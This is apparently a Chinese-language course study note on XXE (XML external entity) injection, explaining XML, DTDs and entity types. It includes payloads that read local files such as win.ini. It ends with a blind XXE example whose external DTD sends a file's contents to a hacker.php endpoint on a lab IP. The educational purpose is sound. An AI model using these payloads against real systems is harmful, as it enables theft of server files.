# 安全牛XXE学习笔记

<div class="has-toc have-toc">
</div>

## 0x00 xml、dtd及blind xxe基础

XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。

XML 指可扩展标记语言（Extensible Markup Language）  
XML 被设计用来传输和存储数据。  
XML语言没有预定义的标签，允许作者定义自己的标签和自己的文档结构。

语法规则：  
XML 文档必须有一个根元素  
XML 元素都必须有一个关闭标签  
XML 标签对大小敏感  
XML 元素必须被正确的嵌套  
XML 属性值必须加引导

范例：

<pre class="wp-block-code"><code>&lt;?xml version="1.0" encoding="IS0-8859-1"?>
&lt;note>
&lt;to>George&lt;/to>
&lt;from>John&lt;/from>
&lt;heading>Reminder&lt;/heading>
&lt;body>Dont forget the meeting!&lt;/body>
&lt;/note></code></pre>

实体引用<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-223.png" alt="" class="wp-image-3204" width="539" height="244" /> </figure> 

DTD（文档类型定义）  
DTD（文档类型定义）的作用是定义XML 文档的合法构建模块。  
DTD 可以在XML 文档内声明，也可以外部引用。

**内部声明**：`<!DOCTYPE 根元素[元素声明]>`

<pre class="wp-block-code"><code>&lt;?xml version="1.0"?>
&lt;!DOCTYPE note&#91;
 &lt;!ELEMENT note    (to,from,heading,body)>
 &lt;!ELEMENT to      (#PCDATA)>
 &lt;!ELEMENT from    (#PCDATA)>
 &lt;!ELEMENT heading (#PCDATA)>
 &lt;!ELEMENT body    (#PCDATA)>
]>
&lt;note>
&lt;to>George&lt;/to>
&lt;from>John&lt;/from>
&lt;heading>Reminder&lt;/heading>
&lt;body>Don't forget the meeting!&lt;/body>
&lt;/note></code></pre>

PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。

**外部声明**：`<!DOCTYPE 根元素SYSTEM "文件名">`

<pre class="wp-block-code"><code>&lt;?xml version="1.0"?>
&lt;!DOCTYPE note SYSTEM "note.dtd">
&lt;note>
&lt;to>George&lt;/to>
&lt;from>John&lt;/from>
&lt;heading>Reminder&lt;/heading>
&lt;body>Don't forget the meeting!&lt;/body>
&lt;/note></code></pre>

**DTD实体构建方式：内部实体声明** `<!ENTITY entity-name "entity-value">`

<pre class="wp-block-code"><code>&lt;?xml version="1.0"?>
&lt;!DOCTYPE mail&#91;
&lt;!ELEMENT mail (message)>
&lt;!ENTITY hacker "hacker's data">
]>
&lt;mail>
&lt;message>&hacker; &lt;/message>
&lt;/mail></code></pre>

**DTD实体构建方式：外部实体声明** `<!ENTITY` `entity-name SYSTEM "URI/URL">`

<pre class="wp-block-code"><code>&lt;?xml version="1.0"?>
&lt;!DOCTYPE mail&#91;
&lt;!ELEMENT mail (message)>
&lt;!ENTITY hacker SYSTEM "file:///C:/Windows/win.ini">
]>
&lt;mail>
&lt;message>&hacker; &lt;/message>
&lt;/mail></code></pre>

**外部声明默认协议及php扩展协议**<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-225.png" alt="" class="wp-image-3208" width="364" height="316" /></figure> 

**参数实体**

参数实体只用于DTD 和文档的内部子集中，XML的规范定义中，只有在DTD中才能引用参数实体. 参数实体的声明和引用都是以百分号%。并且参数实体的引用在DTD是理解解析的，替换文本将变成DTD的一部分。该类型的实体用“％”字符（或十六进制编码的％）声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容。

<pre class="wp-block-code"><code>&lt;?xml version="1.0" encoding="UTF-8"?>
&lt;!DOCTYPE root &#91;
&lt;!ELEMENT root (message)>
&lt;!ENTITY % param1 "&lt;!ENTITY internal 'http://xxx.com'>">
%param1;
]>
&lt;root>
&lt;message>&internal;&lt;/message>
&lt;/root></code></pre>

**简单利用**

<pre class="wp-block-code"><code>&lt;?xml version="1.0" encoding="UTF-8"?>
&lt;!DOCTYPE foo &#91;
&lt;!ELEMENT foo ANY >
&lt;!ENTITY % evil SYSTEM "file:////phpstudy/WwW/bull/xxe/xml/flag.txt" >
&lt;!ENTITY % xxe  SYSTEM "http://172.16.206.99/bull/xxe/xm1/dtd7_2.xml" >
%xxe;
%all;
]>
&lt;foo>&send;&lt;/foo></code></pre>
<pre class="wp-block-code"><code>&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://172.16.206.99/class/xss_get_cookie/hacker.php?
cookie=%evil;'>"></code></pre>
